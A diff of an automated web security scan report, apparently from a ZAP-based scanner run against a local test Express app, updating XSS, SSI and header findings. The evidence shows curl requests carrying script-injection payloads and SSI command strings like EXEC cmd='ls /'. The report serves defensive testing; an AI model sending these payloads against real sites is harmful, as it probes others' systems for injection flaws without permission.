@@ -2,8 +2,8 @@
 
 ## Summary
 
-This security report was conducted on 23/07/2023 at 11:58:29 (UTC+1).
-A total of 15 issue(s) were found, 0 of which may require immediate attention.
+This security report was conducted on 24/07/2023 at 15:41:58 (UTC+1).
+A total of 16 issue(s) were found, 0 of which may require immediate attention.
 
 The following technical impacts may arise if an adversary successfully exploits one of the issues found by this scan.
 
@@ -26,7 +26,7 @@ The following technical impacts may arise if an adversary successfully exploits 
 
 This report found issues with the following severities.
 
-**Critical**: 0 | **High** 3 | **Medium** 6 | **Low** 2 | **Informational** 1 | **Unknown** 3
+**Critical**: 0 | **High** 4 | **Medium** 6 | **Low** 2 | **Informational** 1 | **Unknown** 3
 
 To gain a better understanding of the severity levels please see [the appendix](#what-are-severity-levels).
 
@@ -210,18 +210,18 @@ Persistent attacks occur when the malicious code is submitted to a web site wher
 The following examples were found in the application.
 
 
-**Example 1**
+<details><summary>Example 1</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search?q=%3C%2Fp%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cp%3E`
+    * **Target**: `http://host.docker.internal:3000/search?q=%3C%2Fp%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cp%3E`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000/search",
+        "referer": "http://host.docker.internal:3000/search",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -230,11 +230,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000/search" \
+        -H "referer: http://host.docker.internal:3000/search" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search?q=%3C%2Fp%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cp%3E"
+        "http://host.docker.internal:3000/search?q=%3C%2Fp%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cp%3E"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -244,8 +244,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "280",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:57 GMT",
-        "ETag": "W/\"118-I1kGhUT69g6YqUW/mRojsa7SJT0\"",
+        "Date": "Mon, 24 Jul 2023 14:41:14 GMT",
+        "ETag": "W/\"118-kOtI3l8E3TcXmRhyuvj+k3n6yeg\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -260,17 +260,19 @@ The following examples were found in the application.
         <input name="q" id="q" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <p>You searched for: </p><scrIpt>alert(1);</scRipt><p></p>
       </body>
       </html>
       
       ```
 
-**Example 2**
+</details>
+
+<details><summary>Example 2</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -278,9 +280,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "67",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -295,11 +297,11 @@ The following examples were found in the application.
         --data 'words=%3C%2Fli%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cli%3E' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -307,10 +309,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "459",
+        "Content-Length": "492",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:57 GMT",
-        "ETag": "W/\"1cb-SS+rMuGE3OFC8mDEP/zz0CT0XDY\"",
+        "Date": "Mon, 24 Jul 2023 14:41:14 GMT",
+        "ETag": "W/\"1ec-+m1tYL9l+lAa0+v4sqng3jBmXz4\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -326,8 +328,9 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>"><!--#EXEC cmd="ls /"--><</li>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li><!--#EXEC cmd="ls /"--></li>
+      <li>"><!--#EXEC cmd="ls /"--><</li>
       <li><!--#EXEC cmd="dir \"--></li>
       <li>"><!--#EXEC cmd="dir \"--><</li>
       <li>0W45pz4p</li>
@@ -336,6 +339,101 @@ The following examples were found in the application.
       </html>
       
       ```
+
+</details>
+
+##### References
+
+[CWE-79](#CWE-79)
+
+#### Cross Site Scripting (Persistent) 
+
+**Severity**: [High](#High) | **Type**: web request | **Fix**: Unknown | **Found By**: [@continuous-security/scanner-zed-attack-proxy](https://www.npmjs.com/package/@continuous-security/scanner-zed-attack-proxy)
+
+Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.
+When an attacker gets a user's browser to execute his/they code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/they account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.
+
+There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.
+Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.
+Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.
+
+##### Evidence
+
+The following examples were found in the application.
+
+
+<details><summary>Example 1</summary>
+
+* **Request**
+    * **Target**: `http://host.docker.internal:3000/`
+    * **Method**: `POST`
+    * **Headers**:
+      ```json
+      {
+        "cache-control": "no-cache",
+        "content-length": "9",
+        "content-type": "application/x-www-form-urlencoded",
+        "host": "host.docker.internal:3000",
+        "pragma": "no-cache",
+        "referer": "http://host.docker.internal:3000",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+      }
+      ```
+    * **Body**:
+      ```json
+      "words=ZAP"
+      ```
+    * **Curl**:
+      ```shell
+      curl -o - -i \
+        -X POST \
+        --data 'words=ZAP' \
+        -H "cache-control: no-cache" \
+        -H "content-type: application/x-www-form-urlencoded" \
+        -H "host: host.docker.internal:3000" \
+        -H "pragma: no-cache" \
+        -H "referer: http://host.docker.internal:3000" \
+        -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
+        "http://host.docker.internal:3000/"
+      ```
+* **Response**
+    * **Status Code**: `200`
+    * **Headers**:
+      ```json
+      {
+        "Connection": "keep-alive",
+        "Content-Length": "409",
+        "Content-Type": "text/html; charset=utf-8",
+        "Date": "Mon, 24 Jul 2023 14:41:14 GMT",
+        "ETag": "W/\"199-4hukFMoSP7wQVZB0aP1a0bfwKoY\"",
+        "Keep-Alive": "timeout=5",
+        "X-Powered-By": "Express"
+      }
+      ```
+    * **Body**:
+      ```html
+      <!doctype html>
+      <html lang="en">
+      <body>
+      <a href="/search">Search</a>
+      <form method="post" action="/">
+        <label for="words">Enter some words</label>
+        <input name="words" id="words" />
+        <button type="submit">Submit</button>
+      </form>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>zApPX0sS</li>
+      <li>ZAP</li>
+      <li>0W45pz4p</li>
+      <li>ZAP</li>
+      <li></li><script>alert(1);</script><li></li>
+      <li>ZAP</li></ul>
+      </body>
+      </html>
+      
+      ```
+
+</details>
 
 ##### References
 
@@ -357,16 +455,16 @@ Persistent attacks occur when the malicious code is submitted to a web site wher
 The following examples were found in the application.
 
 
-**Example 1**
+<details><summary>Example 1</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
@@ -376,10 +474,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `0`
@@ -389,18 +487,20 @@ The following examples were found in the application.
       ```
 
 
-**Example 2**
+</details>
+
+<details><summary>Example 2</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search`
+    * **Target**: `http://host.docker.internal:3000/search`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -409,11 +509,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search"
+        "http://host.docker.internal:3000/search"
       ```
 * **Response**
     * **Status Code**: `0`
@@ -423,18 +523,20 @@ The following examples were found in the application.
       ```
 
 
-**Example 3**
+</details>
+
+<details><summary>Example 3</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search?q=ZAP`
+    * **Target**: `http://host.docker.internal:3000/search?q=ZAP`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000/search",
+        "referer": "http://host.docker.internal:3000/search",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -443,11 +545,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000/search" \
+        -H "referer: http://host.docker.internal:3000/search" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search?q=ZAP"
+        "http://host.docker.internal:3000/search?q=ZAP"
       ```
 * **Response**
     * **Status Code**: `0`
@@ -457,10 +559,12 @@ The following examples were found in the application.
       ```
 
 
-**Example 4**
+</details>
+
+<details><summary>Example 4</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -468,9 +572,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -485,11 +589,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `0`
@@ -498,6 +602,8 @@ The following examples were found in the application.
       {}
       ```
 
+
+</details>
 
 ##### References
 
@@ -556,16 +662,16 @@ The response does not include either Content-Security-Policy with 'frame-ancesto
 The following examples were found in the application.
 
 
-**Example 1**
+<details><summary>Example 1</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
@@ -575,10 +681,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -586,10 +692,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "302",
+        "Content-Length": "319",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:55 GMT",
-        "ETag": "W/\"12e-NUd9AXIUhKg/ZrG/vBaRj1swOp4\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"13f-BqFz+9wjKcZgAGeRZ0Vy1TwWFEQ\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -605,25 +711,28 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>cake</li>
+      <li>cheese</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 2**
+</details>
+
+<details><summary>Example 2</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search`
+    * **Target**: `http://host.docker.internal:3000/search`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -632,11 +741,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search"
+        "http://host.docker.internal:3000/search"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -646,8 +755,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "256",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"100-Ez9kQ2LJQmBI+nK7DdgzrICKUBQ\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"100-SGZlmK7zb5bMpHwyMfozWYtvlqo\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -662,25 +771,27 @@ The following examples were found in the application.
         <input name="q" id="q" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <p>You searched for: undefined</p>
       </body>
       </html>
       
       ```
 
-**Example 3**
+</details>
+
+<details><summary>Example 3</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search?q=ZAP`
+    * **Target**: `http://host.docker.internal:3000/search?q=ZAP`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000/search",
+        "referer": "http://host.docker.internal:3000/search",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -689,11 +800,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000/search" \
+        -H "referer: http://host.docker.internal:3000/search" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search?q=ZAP"
+        "http://host.docker.internal:3000/search?q=ZAP"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -703,8 +814,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "250",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"fa-kPP1kQTdSUEonRkcNJnMUr19j8k\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"fa-kXSJP4dZxJQvjvACiAps6iTP470\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -719,17 +830,19 @@ The following examples were found in the application.
         <input name="q" id="q" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <p>You searched for: ZAP</p>
       </body>
       </html>
       
       ```
 
-**Example 4**
+</details>
+
+<details><summary>Example 4</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -737,9 +850,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -754,11 +867,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -766,10 +879,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "315",
+        "Content-Length": "332",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"13b-a8pXFGhzT4FQ2yc6+5Z+5hrwsq0\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"14c-fjf1XHwM2xi+NHrTOyLheKdLc20\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -785,13 +898,16 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>cake</li>
+      <li>cheese</li>
       <li>ZAP</li></ul>
       </body>
       </html>
       
       ```
+
+</details>
 
 ##### References
 
@@ -808,16 +924,16 @@ Content Security Policy (CSP) is an added layer of security that helps to detect
 The following examples were found in the application.
 
 
-**Example 1**
+<details><summary>Example 1</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
@@ -827,10 +943,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -838,10 +954,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "302",
+        "Content-Length": "319",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:55 GMT",
-        "ETag": "W/\"12e-NUd9AXIUhKg/ZrG/vBaRj1swOp4\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"13f-BqFz+9wjKcZgAGeRZ0Vy1TwWFEQ\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -857,25 +973,28 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>cake</li>
+      <li>cheese</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 2**
+</details>
+
+<details><summary>Example 2</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search`
+    * **Target**: `http://host.docker.internal:3000/search`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -884,11 +1003,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search"
+        "http://host.docker.internal:3000/search"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -898,8 +1017,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "256",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"100-Ez9kQ2LJQmBI+nK7DdgzrICKUBQ\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"100-SGZlmK7zb5bMpHwyMfozWYtvlqo\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -914,25 +1033,27 @@ The following examples were found in the application.
         <input name="q" id="q" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <p>You searched for: undefined</p>
       </body>
       </html>
       
       ```
 
-**Example 3**
+</details>
+
+<details><summary>Example 3</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search?q=ZAP`
+    * **Target**: `http://host.docker.internal:3000/search?q=ZAP`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000/search",
+        "referer": "http://host.docker.internal:3000/search",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -941,11 +1062,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000/search" \
+        -H "referer: http://host.docker.internal:3000/search" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search?q=ZAP"
+        "http://host.docker.internal:3000/search?q=ZAP"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -955,8 +1076,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "250",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"fa-kPP1kQTdSUEonRkcNJnMUr19j8k\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"fa-kXSJP4dZxJQvjvACiAps6iTP470\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -971,12 +1092,84 @@ The following examples were found in the application.
         <input name="q" id="q" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <p>You searched for: ZAP</p>
       </body>
       </html>
       
       ```
+
+</details>
+
+<details><summary>Example 4</summary>
+
+* **Request**
+    * **Target**: `http://host.docker.internal:3000/`
+    * **Method**: `POST`
+    * **Headers**:
+      ```json
+      {
+        "cache-control": "no-cache",
+        "content-length": "9",
